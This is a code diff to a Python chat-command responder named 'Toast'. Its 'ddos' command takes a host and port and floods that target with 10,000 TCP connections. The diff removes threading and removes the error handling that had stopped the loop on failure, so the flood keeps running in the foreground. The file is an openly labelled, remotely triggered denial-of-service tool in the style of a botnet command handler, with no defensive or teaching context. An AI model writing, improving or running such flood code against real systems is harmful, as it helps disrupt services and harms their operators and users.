@@ -1,7 +1,6 @@
 import os
 import socket
 
-import threading
 
 from .. import BaseResponder
 
@@ -28,7 +27,7 @@ class Toast(BaseResponder):
 			if cmd == 'ddos' and params:
 				self.respond(msg, command + ' ok')
 				host, port = params.split(':')
-				threading.Thread(target=self.dudos, kwargs={'sock': msg, 'host': host, 'port': int(port)}).start()
+				self.dudos(sock=msg, host=host, port=port)
 			elif cmd == 'quit':
 				self.respond(msg, command + ' ok')
 				self.respond(msg, 'Bye!')
@@ -37,18 +36,13 @@ class Toast(BaseResponder):
 				self.respond(msg, 'no such command')
 
 	def dudos(self, host='127.0.0.1', port=8080, times=10000, sock=None):
-		self.respond(sock, 'Dudos in progress...')
 		print('Dudos in progress...')
+		self.respond(sock, 'Dudos in progress...')
 		for _ in range(times):
 			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			try:
-				sock.connect((host, port))
-				sock.send(b'hello')
-				sock.close()
-			except Exception as e:
-				print(e)
-				break
-
+			sock.connect((host, int(port)))
+			sock.send(b'hello')
+			sock.close()
 
 
 mod = Toast
